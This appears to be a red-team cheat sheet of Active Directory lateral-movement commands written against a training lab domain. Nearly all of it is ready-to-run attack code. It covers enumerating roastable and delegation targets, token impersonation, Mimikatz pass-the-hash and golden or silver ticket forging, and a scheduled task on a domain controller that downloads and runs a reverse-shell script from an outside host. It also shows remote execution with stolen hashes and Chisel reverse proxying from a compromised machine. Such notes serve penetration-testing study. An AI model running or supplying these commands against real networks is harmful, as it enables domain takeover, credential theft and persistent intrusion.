# Lateral Movement Enumeration
### Lateral Movement Enumeration With PowerView

```powershell
# Find existing local admin access for user (noisy 🚩)
Find-LocalAdminAccess

# Find local admin access over PS remoting (also noisy 🚩), requires Find-PSRemotingLocalAdminAccess.ps1
Get-NetComputer -Domain dollarcorp.moneycorp.local > .\targets.txt
Find-PSRemotingLocalAdminAccess -ComputerFile .\targets.txt dcorp-std355

# Same for WMI. Requires 'Find-WMILocalAdminAccess.ps1', which seems to be removed from Nishang?
Find-WMILocalAdminAccess -ComputerFile .\targets.txt
Find-WMILocalAdminAccess # Finds domain computers automatically

# Hunt for sessions of interesting users on machines where you have access (still noisy 🚩)
Invoke-UserHunter -CheckAccess | ?{$_.LocalAdmin -Eq True }

# Look for kerberoastable users
Get-DomainUser -SPN | select name,serviceprincipalname

# Look for AS-REP roastable users
Get-DomainUser -PreauthNotRequired | select name

# Look for users on which we can set UserAccountControl flags
## If available - disable preauth or add SPN (see below)
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

# Look for servers with Unconstrained Delegation enabled
## If available and you have admin privs on this server, get user TGT (see below)
Get-DomainComputer -Unconstrained

# Look for users or computers with Constrained Delegation enabled
## If available and you have user/computer hash, access service machine as DA (see below)
Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
```

***

# Lateral Movement Abuse
## ADFS
- Connect legitimately to other services
- [Golden Token ADFS attack](https://www.qomplx.com/golden-ticket-attack-on-adfs/)
***

## Browser Pivoting
***

 ## GPO Abuse

***

### Token Manipulation

Tokens can be impersonated from other users with a session/running processes on the machine. A similar effect can be achieved by using e.g. CobaltStrike to inject into said processes.

#### Incognito

```powershell
# Show tokens on the machine
.\incognito.exe list_tokens -u

# Start new process with token of a specific user
.\incognito.exe execute -c "domain\user" C:\Windows\system32\calc.exe
```

> If you’re using Meterpreter, you can use the built-in Incognito module with `use incognito`, the same commands are available.

#### Invoke-TokenManipulation

```powershell
# Show all tokens on the machine
Invoke-TokenManipulation -ShowAll

# Show only unique, usable tokens on the machine
Invoke-TokenManipulation -Enumerate

# Start new process with token of a specific user
Invoke-TokenManipulation -ImpersonateUser -Username "domain\user"

# Start new process with token of another process
Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\calc.exe" -ProcessId 500
```

### Mimikatz

```plaintext
# Overpass the hash
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:[NTLMHASH] /run:powershell.exe

# Golden ticket (domain admin, w/ some ticket properties to avoid detection)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt

# Silver ticket for a specific SPN with a compromised service / machine account
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.domain.local /service:HOST /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt
```

> A list of available SPNs for silver tickets can be found [here](https://adsecurity.org/?page_id=183). Another nice overview for SPNs relevant for offensive is provided [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#pass-the-ticket-silver-tickets).

### Command execution with schtasks

_Requires ‘Host’ SPN_

To create a task:

```powershell
# Mind the quotes. Use encoded commands if quoting becomes a pain.
schtasks /create /tn "shell" /ru "NT Authority\SYSTEM" /s dcorp-dc.dollarcorp.moneycorp.local /sc weekly /tr "Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1''')'"
```

To trigger it:

```powershell
schtasks /RUN /TN "shell" /s dcorp-dc.dollarcorp.moneycorp.local
```

### Command execution with WMI

_Requires ‘Host’ and ‘RPCSS’ SPNs_

#### From Windows

```powershell
Invoke-WmiMethod win32_process -ComputerName dcorp-dc.dollarcorp.moneycorp.local -name create -argumentlist "powershell.exe -e $encodedCommand"
```

#### From Linux

```bash
# with password
impacket-wmiexec dcorp/student355:password@172.16.4.101

# with hash
impacket-wmiexec dcorp/student355@172.16.4.101 -hashes :92F4AE6DCDAC7CF870B79F1758503D54
```

### Command execution with PowerShell Remoting

_Requires ‘CIFS’, ‘HTTP’ and ‘WSMAN’ SPNs_

> This one is a bit tricky. A combination of the above SPNs may or may not work - also PowerShell may require the exact FQDN to be provided.

```powershell
# Create credential to run as another user (if needed, not needed with PTT)
# Leave out -Credential $Cred in the below commands if not using
$SecPassword = ConvertTo-SecureString 'thePassword' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('CORP\username', $SecPassword)

# Run a command remotely (can be used one-to-many!)
Invoke-Command -Credential $Cred -ComputerName $computer -ScriptBlock {whoami; hostname}

# Launch a session as another user (prompt for password)
Enter-PsSession -Credential $Cred -ComputerName $computer -Credential dcorp\Administrator

# Create a persistent session (will remember variables etc.), load a script into said session, and enter a remote session promptEE
$sess = New-PsSession -Credential $Cred
Invoke-Command -Session $sess -FilePath c:\path\to\file.ps1
Enter-PsSession -Session $sess

# Copy files to or from an active PowerShell remoting session
Copy-Item -Path .\Invoke-Mimikatz.ps1 -ToSession $sess2 -Destination "C:\Users\dbprodadmin\documents\
```

***


### Chisel proxying

Just an example on how to set up a Socks proxy to chisel over a compromised host. There are many more things you can do with Chisel!

On attacker machine (Linux or Windows):

```bash
./chisel server -p 8888 --reverse
```

On target:

```powershell
.\chisel_windows_386.exe client 10.10.16.7:8888 R:8001:127.0.0.1:9001
```

Now we are listening on `localhost:8001` on our attacking machine to forward that traffic to `target:9001`.

Then, open the Socks server. On target:

```powershell
.\chisel_windows_386.exe server -p 9001 --socks5
```

On attacking machine:

```bash
./chisel client localhost:8001 socks
```

A proxy is now open on port 1080 of our attacking machine.